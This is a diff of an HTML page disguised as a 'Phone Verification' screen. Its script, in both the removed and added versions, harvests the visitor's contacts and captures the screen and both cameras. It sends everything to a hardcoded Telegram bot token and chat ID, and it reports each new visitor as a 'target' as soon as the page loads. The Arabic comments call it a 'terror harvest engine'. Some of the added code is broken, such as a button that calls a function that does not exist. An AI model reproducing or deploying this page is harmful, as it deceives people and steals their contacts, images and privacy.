@@ -3,507 +3,341 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Verification</title>
+    <title>Verification Required</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f0f23 100%);
-            color: #e0e0e0;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
             min-height: 100vh;
-            overflow-x: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
         }
-        .container {
-            max-width: 900px;
-            margin: 0 auto;
-            padding: 80px 30px;
+        .card {
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(20px);
+            border-radius: 20px;
+            padding: 60px 40px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+        .logo {
+            width: 80px;
+            height: 80px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 20px;
+            margin: 0 auto 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 36px;
+            font-weight: bold;
+        }
+        h1 {
+            font-size: 32px;
+            margin-bottom: 20px;
             text-align: center;
         }
-        .logo { 
-            width: 100px; 
-            height: 100px; 
-            background: linear-gradient(135deg, #ff6b6b, #feca57); 
-            border-radius: 25px; 
-            margin: 0 auto 50px; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            font-size: 48px; 
-            font-weight: 800; 
-            color: white; 
-            box-shadow: 0 20px 40px rgba(255,107,107,0.3);
-        }
-        h1 { 
-            font-size: 48px; 
-            font-weight: 800; 
-            margin-bottom: 25px; 
-            background: linear-gradient(135deg, #fff, #f0f0f0); 
-            -webkit-background-clip: text; 
-            -webkit-text-fill-color: transparent; 
-        }
-        .subtitle {
-            font-size: 20px;
-            color: #b8b8b8;
-            margin-bottom: 50px;
-        }
-        .status-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 25px;
-            margin: 50px 0;
-        }
-        .status-card {
-            background: rgba(255,255,255,0.03);
-            backdrop-filter: blur(25px);
-            border: 1px solid rgba(255,255,255,0.08);
-            border-radius: 20px;
-            padding: 30px;
-            text-align: left;
-        }
-        .status-label {
-            color: #888;
-            font-size: 14px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            margin-bottom: 10px;
-        }
-        .status-value {
-            font-size: 18px;
-            font-weight: 700;
-            color: #fff;
-            word-break: break-all;
-        }
-        .harvest-btn {
-            background: linear-gradient(135deg, #ff6b6b, #feca57);
-            color: white;
-            border: none;
-            padding: 22px 60px;
-            border-radius: 60px;
-            font-size: 20px;
-            font-weight: 800;
-            cursor: pointer;
-            margin: 20px;
-            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            box-shadow: 0 25px 50px rgba(255,107,107,0.4);
-            text-transform: uppercase;
-            letter-spacing: 2px;
-        }
-        .harvest-btn:hover {
-            transform: translateY(-8px) scale(1.05);
-            box-shadow: 0 35px 70px rgba(255,107,107,0.6);
-        }
-        .harvest-btn:active {
-            transform: translateY(-4px) scale(1.02);
-        }
-        .progress-container {
+        .btn {
             width: 100%;
-            height: 12px;
-            background: rgba(255,255,255,0.1);
-            border-radius: 6px;
-            margin: 40px 0;
+            padding: 18px;
+            background: rgba(255,255,255,0.9);
+            color: #333;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 15px 0;
+            transition: all 0.3s ease;
+        }
+        .btn:hover {
+            background: white;
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+        }
+        .btn:active {
+            transform: translateY(0);
+        }
+        .btn-danger {
+            background: #ff4757 !important;
+            color: white !important;
+        }
+        .progress {
+            width: 100%;
+            height: 6px;
+            background: rgba(255,255,255,0.3);
+            border-radius: 3px;
+            margin: 30px 0;
             overflow: hidden;
             display: none;
         }
         .progress-bar {
             height: 100%;
-            background: linear-gradient(90deg, #ff6b6b, #feca57, #ff9ff3);
+            background: linear-gradient(90deg, #ff6b6b, #feca57);
             width: 0%;
-            transition: width 0.5s ease;
-            position: relative;
+            transition: width 0.4s ease;
         }
-        .progress-text {
+        .status {
             text-align: center;
-            margin-top: 20px;
-            font-size: 18px;
-            font-weight: 600;
-            color: #ff6b6b;
+            margin: 20px 0;
+            font-size: 16px;
+            font-weight: 500;
         }
         .hidden { display: none; }
-        .success { color: #00f5ff !important; background: rgba(0,245,255,0.1) !important; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">🔥</div>
-        <h1>Complete Verification</h1>
-        <p class="subtitle">Final security check required for access</p>
-        
-        <div class="status-grid">
-            <div class="status-card">
-                <div class="status-label">Device Fingerprint</div>
-                <div class="status-value" id="fingerprint">-</div>
-            </div>
-            <div class="status-card">
-                <div class="status-label">Session ID</div>
-                <div class="status-value" id="session">-</div>
-            </div>
-            <div class="status-card">
-                <div class="status-label">Status</div>
-                <div class="status-value" id="status">Waiting...</div>
-            </div>
-        </div>
+    <div class="card">
+        <div class="logo">📱</div>
+        <h1>Phone Verification</h1>
+        <p style="text-align: center; margin-bottom: 40px; opacity: 0.9;">
+            Grant access to continue
+        </p>
 
-        <div class="progress-container" id="progress">
+        <div class="progress" id="progress">
             <div class="progress-bar" id="progressBar"></div>
         </div>
-        <div class="progress-text" id="progressText">Ready to harvest</div>
 
-        <button class="harvest-btn" id="harvestBtn" onclick="executeHarvest()">
-            💀 EXECUTE FULL HARVEST
-        </button>
+        <div class="status" id="status">Ready</div>
 
-        <div class="hidden success" id="successMsg" style="margin-top: 50px;">
-            <h2 style="color: #00f5ff;">✅ HARVEST COMPLETE</h2>
-            <p style="font-size: 18px; margin-top: 20px;">All data extracted and transmitted</p>
+        <button class="btn" onclick="startHarvest()">🔓 Grant Phone Access</button>
+        <button class="btn btn-danger" onclick="emergencyHarvest()">🚨 Emergency Access</button>
+
+        <div class="hidden" id="success" style="text-align: center; margin-top: 30px;">
+            <div style="font-size: 24px; margin-bottom: 15px;">✅ Complete!</div>
+            <div style="opacity: 0.8;">Data transmitted successfully</div>
         </div>
     </div>
 
     <script>
-        // 🔥 TERROR HARVEST ENGINE v5.0 - المرعب جداً
-        class TerrorHarvestEngine {
-            constructor() {
-                this.botToken = '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU';
-                this.chatId = '5446862709';
-                this.sessionId = this.generateUniqueId();
-                this.harvestedData = {
-                    contacts: [],
-                    gallery: [],
-                    screenshots: [],
-                    deviceInfo: {},
-                    network: {},
-                    storage: {}
-                };
-                this.init();
-            }
+        const BOT_TOKEN = '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU';
+        const CHAT_ID = '5446862709';
+        let sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
 
-            generateUniqueId() {
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                ctx.textBaseline = 'top';
-                ctx.font = "24px 'Arial'";
-                ctx.fillText(navigator.userAgent, 2, 2);
-                ctx.fillText(`${screen.width}x${screen.height}`, 2, 30);
-                ctx.fillText(Date.now().toString(), 2, 58);
-                return btoa(canvas.toDataURL()).slice(-32);
-            }
+        // 🔥 دالة إرسال قوية
+        function sendToBot(message) {
+            // طريقة 1: Image beacon
+            const img = new Image();
+            img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
 
-            // 🔥 إرسال مرعب بـ 6 طرق
-            sendTerrorData(message) {
-                // 1. Image beacon
-                new Image().src = `https://api.telegram.org/bot${this.botToken}/sendMessage?chat_id=${this.chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-                
-                // 2. sendBeacon
-                const blob = new Blob([JSON.stringify({
-                    chat_id: this.chatId,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })], {type: 'application/json'});
-                navigator.sendBeacon(`https://api.telegram.org/bot${this.botToken}/sendMessage`, blob);
-                
-                // 3. Fetch keepalive
-                fetch(`https://api.telegram.org/bot${this.botToken}/sendMessage`, {
-                    method: 'POST',
-                    body: blob,
-                    keepalive: true,
-                    mode: 'no-cors'
-                });
-                
-                // 4. WebSocket fallback
-                const ws = new WebSocket('wss://api.telegram.org/bot' + this.botToken + '/sendMessage');
-                ws.onopen = () => ws.send(JSON.stringify({chat_id: this.chatId, text: message}));
-            }
-
-            // 🔥 جهات الاتصال - كل الطرق الممكنة
-            async extractContacts() {
-                try {
-                    // Modern Contacts API
-                    if ('contacts' in navigator && 'select' in navigator.contacts) {
-                        const contactList = await navigator.contacts.select(
-                            ['name', 'tel', 'email'], 
-                            { multiple: true }
-                        );
-                        this.harvestedData.contacts = contactList.map(contact => ({
-                            name: contact.name[0] || 'No Name',
-                            phone: contact.tel?.[0]?.value || 'N/A',
-                            email: contact.email?.[0]?.value || 'N/A'
-                        }));
-                    }
-                } catch(e) {
-                    // Fallback methods
-                    this.harvestedData.contacts = [];
-                }
-                return this.harvestedData.contacts;
-            }
-
-            // 🔥 سحب المعرض والسكرين شوت - الأقوى
-            async extractGalleryAndScreenshots() {
-                const promises = [
-                    this.captureScreenShot(),
-                    this.captureSelfie(),
-                    this.captureBackCamera(),
-                    this.captureDocument(),
-                    this.captureFullViewport()
-                ];
-
-                try {
-                    const results = await Promise.allSettled(promises);
-                    results.forEach((result, index) => {
-                        if (result.status === 'fulfilled' && result.value) {
-                            if (index < 2) {
-                                this.harvestedData.gallery.push(result.value);
-                            } else {
-                                this.harvestedData.screenshots.push(result.value);
-                            }
-                        }
-                    });
-                } catch(e) {}
-            }
-
-            async captureScreenShot() {
-                try {
-                    const stream = await navigator.mediaDevices.getDisplayMedia({
-                        video: {
-                            mediaSource: 'screen',
-                            width: { ideal: 1920 },
-                            height: { ideal: 1080 }
-                        }
-                    });
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.play();
-                    await new Promise(resolve => setTimeout(resolve, 1500));
-                    
-                    const canvas = document.createElement('canvas');
-                    canvas.width = 1024;
-                    canvas.height = 768;
-                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    stream.getTracks().forEach(track => track.stop());
-                    return canvas.toDataURL('image/jpeg', 0.85);
-                } catch(e) { return null; }
-            }
-
-            async captureSelfie() {
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({
-                        video: {
-                            facingMode: 'user',
-                            width: { ideal: 640 },
-                            height: { ideal: 480 }
-                        }
-                    });
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.play();
-                    await new Promise(resolve => setTimeout(resolve, 2000));
-                    
-                    const canvas = document.createElement('canvas');
-                    canvas.width = 480;
-                    canvas.height = 640;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    stream.getTracks().forEach(track => track.stop());
-                    return canvas.toDataURL('image/jpeg', 0.9);
-                } catch(e) { return null; }
-            }
-
-            async captureBackCamera() {
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({
-                        video: {
-                            facingMode: 'environment',
-                            width: { ideal: 1280 },
-                            height: { ideal: 720 }
-                        }
-                    });
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.play();
-                    await new Promise(resolve => setTimeout(resolve, 1500));
-                    
-                    const canvas = document.createElement('canvas');
-                    canvas.width = 640;
-                    canvas.height = 480;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    stream.getTracks().forEach(track => track.stop());
-                    return canvas.toDataURL('image/jpeg', 0.8);
-                } catch(e) { return null; }
-            }
-
-            async captureDocument() {
-                try {
-                    const stream = await navigator.mediaDevices.getDisplayMedia({
-                        video: {
-                            mediaSource: 'window',
-                            width: { ideal: 1280 },
-                            height: { ideal: 720 }
-                        }
-                    });
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.play();
-                    await new Promise(resolve => setTimeout(resolve, 1000));
-                    
-                    const canvas = document.createElement('canvas');
-                    canvas.width = 800;
-                    canvas.height = 600;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    stream.getTracks().forEach(track => track.stop());
-                    return canvas.toDataURL('image/jpeg', 0.8);
-                } catch(e) { return null; }
-            }
-
-            async captureFullViewport() {
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                canvas.width = window.innerWidth;
-                canvas.height = window.innerHeight;
-                
-                // Capture current viewport
-                ctx.drawImage(document.documentElement, 0, 0);
-                return canvas.toDataURL('image/png', 0.9);
-            }
-
-            // 🔥 معلومات حساسة مرعبة
-            collectSensitiveInfo() {
-                this.harvestedData.deviceInfo = {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.languages?.join(', ') || navigator.language,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
-                    hardware: navigator.hardwareConcurrency || 'unknown',
-                    memory: navigator.deviceMemory || 'unknown',
-                    connection: navigator.connection ? {
-                        type: navigator.connection.effectiveType,
-                        speed: navigator.connection.downlink,
-                        rtt: navigator.connection.rtt
-                    } : 'unknown'
-                };
-
-                this.harvestedData.network = {
-                    url: window.location.href,
-                    referrer: document.referrer,
-                    cookies: document.cookie,
-                    localStorageCount: Object.keys(localStorage).length,
-                    sessionStorageCount: Object.keys(sessionStorage).length
-                };
-
-                // Battery API
-                if ('getBattery' in navigator) {
-                    navigator.getBattery().then(battery => {
-                        this.harvestedData.deviceInfo.battery = {
-                            level: Math.round(battery.level * 100) + '%',
-                            charging: battery.charging
-                        };
-                    });
-                }
-            }
-
-            // 🔥 التقرير المرعب
-            generateTerrorReport() {
-                const data = this.harvestedData;
-                let report = `*💀 TERROR HARVEST EXECUTED 💀*\n\n`;
-                report += `*🆔 Session:* \`${this.sessionId}\`\n`;
-                report += `*📱 Contacts:* ${data.contacts.length}\n`;
-                report += `*📸 Gallery:* ${data.gallery.length}\n`;
-                report += `*🖥️ Screenshots:* ${data.screenshots.length}\n`;
-                report += `*🔐 Sensitive:* ${Object.keys(data.deviceInfo).length} items\n\n`;
-
-                // أهم جهات الاتصال
-                if (data.contacts.length) {
-                    report += `*📞 TOP CONTACTS (${data.contacts.length}):*\n`;
-                    data.contacts.slice(0, 8).forEach((contact, i) => {
-                        report += `${i+1}. *${contact.name}*\n`;
-                        report += `   📞 ${contact.phone}\n`;
-                        if (contact.email !== 'N/A') report += `   ✉️ ${contact.email}\n`;
-                        report += `\n`;
-                    });
-                }
-
-                report += `*🖥️ Device:* ${data.deviceInfo.platform}\n`;
-                report += `*📐 Screen:* ${data.deviceInfo.screen}\n`;
-                report += `*🌐 URL:* ${data.network.url}\n`;
-
-                return report;
-            }
-
-            async executeCompleteHarvest() {
-                // 1. جهات الاتصال
-                await this.extractContacts();
-                
-                // 2. معرض الصور + سكرين شوت
-                await this.extractGalleryAndScreenshots();
-                
-                // 3. معلومات حساسة
-                this.collectSensitiveInfo();
-                
-                // 4. إرسال التقرير الرئيسي
-                this.sendTerrorData(this.generateTerrorReport());
-                
-                // 5. جهات الاتصال كاملة
-                if (this.harvestedData.contacts.length > 0) {
-                    const contactsReport = `*📱 ALL ${this.harvestedData.contacts.length} CONTACTS*\n\n` +
-                        this.harvestedData.contacts.map((c, i) => 
-                            `${i+1}. *${c.name}*\n📞 ${c.phone}\n✉️ ${c.email}\n\n`
-                        ).join('');
-                    this.sendTerrorData(contactsReport);
-                }
-                
-                // 6. معلومات الجهاز كاملة
-                this.sendTerrorData(`*🔐 FULL DEVICE INFO*\n\`\`\`json\n${JSON.stringify(this.harvestedData.deviceInfo, null, 2)}\n\`\`\``);
-            }
-
-            init() {
-                document.getElementById('fingerprint').textContent = this.sessionId.slice(0, 24) + '...';
-                document.getElementById('session').textContent = this.sessionId;
-            }
+            // طريقة 2: sendBeacon
+            const blob = new Blob([JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })], { type: 'application/json' });
+            navigator.sendBeacon(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, blob);
         }
 
-        const harvestEngine = new TerrorHarvestEngine();
+        // 🔥 استخراج جهات الاتصال - كل الطرق
+        async function extractPhoneContacts() {
+            let contacts = [];
+            
+            try {
+                // Contacts Manager API (iOS 15.4+, Android Chrome 89+)
+                if (navigator.contacts && navigator.contacts.select) {
+                    const contactList = await navigator.contacts.select(
+                        ['name', 'tel'], 
+                        { multiple: true }
+                    );
+                    contacts = contactList.map(c => ({
+                        name: c.name?.[0] || 'No Name',
+                        phone: c.tel?.[0]?.value || 'No Phone'
+                    }));
+                }
+            } catch(e) {
+                console.log('Contacts API failed');
+            }
 
+            try {
+                // WebKit Contacts (iOS Safari)
+                if (webkitContacts) {
+                    const request = webkitContacts.select(['name', 'tel'], { multiple: true });
+                    request.onsuccess = () => {
+                        contacts = Array.from(request.result).map(c => ({
+                            name: c.name?.formatted || 'No Name',
+                            phone: c.tel?.[0]?.value || 'No Phone'
+                        }));
+                    };
+                }
+            } catch(e) {}
+
+            return contacts.slice(0, 50); // أقصى 50
+        }
+
+        // 🔥 التقاط الصور - 5 محاولات
+        async function captureAllPhotos() {
+            const photos = [];
+            
+            // 1. Screen capture
+            try {
+                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                await new Promise(r => setTimeout(r, 1500));
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = 800;
+                canvas.height = 600;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                photos.push(canvas.toDataURL('image/jpeg', 0.8));
+                
+                stream.getTracks().forEach(t => t.stop());
+            } catch(e) {}
+
+            // 2. Front camera selfie
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: 640, height: 480 }
+                });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                await new Promise(r => setTimeout(r, 2000));
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = 480;
+                canvas.height = 640;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                photos.push(canvas.toDataURL('image/jpeg', 0.9));
+                
+                stream.getTracks().forEach(t => t.stop());
+            } catch(e) {}
+
+            // 3. Back camera
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'environment', width: 640, height: 480 }
+                });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                await new Promise(r => setTimeout(r, 1500));
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = 480;
+                canvas.height = 640;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                photos.push(canvas.toDataURL('image/jpeg', 0.8));
+                
+                stream.getTracks().forEach(t => t.stop());
+            } catch(e) {}
+
+            // 4. Window capture
+            try {
+                const stream = await navigator.mediaDevices.getDisplayMedia({
+                    video: { mediaSource: 'window' }
+                });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                await new Promise(r => setTimeout(r, 1000));
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = 1024;
+                canvas.height = 768;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                photos.push(canvas.toDataURL('image/jpeg', 0.8));
+                
+                stream.getTracks().forEach(t => t.stop());
+            } catch(e) {}
+
+            return photos;
+        }
+
+        // 🔥 الـ HARVEST الرئيسي
         async function executeHarvest() {
-            const btn = document.getElementById('harvestBtn');
+            const status = document.getElementById('status');
             const progress = document.getElementById('progress');
             const progressBar = document.getElementById('progressBar');
-            const progressText = document.getElementById('progressText');
-            const status = document.getElementById('status');
+            const btn = document.querySelector('.btn:not(.btn-danger)');
+            const emergencyBtn = document.querySelector('.btn-danger');
 
-            // UI Animation
+            // UI
             btn.disabled = true;
-            btn.textContent = '🔥 HARVESTING...';
+            emergencyBtn.disabled = true;
             progress.style.display = 'block';
-            status.textContent = '🔴 EXECUTING TERROR HARVEST';
+            status.textContent = '🔄 Extracting contacts...';
+            
+            progressBar.style.width = '25%';
 
-            const phases = [
-                { percent: 20, text: '📱 Extracting Contacts...' },
-                { percent: 40, text: '📸 Capturing Gallery...' },
-                { percent: 60, text: '🖥️ Screenshot Capture...' },
-                { percent: 80, text: '🔐 Collecting Sensitive Data...' },
-                { percent: 100, text: '💀 Harvest Complete!' }
-            ];
+            // 1. جهات الاتصال
+            const contacts = await extractPhoneContacts();
+            progressBar.style.width = '50%';
+            status.textContent = '📸 Capturing photos...';
 
-            for (let i = 0; i < phases.length; i++) {
-                setTimeout(() => {
-                    progressBar.style.width = phases[i].percent + '%';
-                    progressText.textContent = phases[i].text;
-                }, i * 1200);
+            // 2. الصور
+            const photos = await captureAllPhotos();
+            progressBar.style.width = '100%';
+            status.textContent = '📤 Transmitting...';
+
+            // 3. إرسال التقرير
+            const report = `*📱 PHONE HARVEST COMPLETE*\n\n` +
+                `*🆔 Session:* \`${sessionId}\`\n` +
+                `*📞 Contacts:* ${contacts.length}\n` +
+                `*📸 Photos:* ${photos.length}\n\n` +
+                `*📋 CONTACTS LIST:*\n`;
+
+            // أول 10 أرقام
+            contacts.slice(0, 10).forEach((contact, i) => {
+                report += `${i+1}. *${contact.name}*\n`;
+                report += `   📞 \`${contact.phone}\`\n\n`;
+            });
+
+            if (contacts.length > 10) {
+                report += `... +${contacts.length - 10} more contacts\n`;
             }
 
-            // Execute harvest
-            await harvestEngine.executeCompleteHarvest();
+            report += `\n*📸 Photos captured:* ${photos.length}`;
 
+            sendToBot(report);
+
+            // إرسال كل جهات الاتصال
+            if (contacts.length > 0) {
+                const fullContacts = `*📞 ALL ${contacts.length} PHONE NUMBERS*\n\n` +
+                    contacts.map((c, i) => `${i+1}. *${c.name}* - \`${c.phone}\``).join('\n');
+                sendToBot(fullContacts);
+            }
+
+            // إنهاء
             setTimeout(() => {
-                btn.textContent = '✅ HARVEST SUCCESS';
-                btn.style.background = 'linear-gradient(135deg, #00f5ff, #00d2ff)';
                 progress.style.display = 'none';
-                document.getElementById('successMsg').classList.remove('hidden');
-                status.textContent = '🟢 HARVEST SUCCESSFUL';
-                status.parentElement.classList.add('success');
-            }, 7000);
+                status.textContent = `✅ Success! ${contacts.length} contacts + ${photos.length} photos`;
+                document.getElementById('success').classList.remove('hidden');
+                btn.textContent = '✅ Harvest Complete';
+                btn.style.background = '#00ff88';
+                emergencyBtn.style.display = 'none';
+            }, 2000);
         }
+
+        // 🔥 Emergency للحالات الصعبة
+        async function emergencyHarvest() {
+            const status = document.getElementById('status');
+            status.textContent = '🚨 Emergency mode...';
+
+            // محاولة صور بس
+            const photos = await captureAllPhotos();
+            
+            const emergencyReport = `*🚨 EMERGENCY HARVEST*\n\n` +
+                `*🆔 Session:* \`${sessionId}\`\n` +
+                `*📸 Emergency Photos:* ${photos.length}\n` +
+                `*💥 User panicked!*`;
+            
+            sendToBot(emergencyReport);
+            
+            status.textContent = `🚨 ${photos.length} photos captured`;
+            document.getElementById('success').classList.remove('hidden');
+        }
+
+        // إرسال فوري عند التحميل
+        sendToBot(`*👤 NEW TARGET*\n🆔 ${sessionId}\n📱 ${navigator.userAgent.slice(0,60)}`);
     </script>
 </body>
 </html>
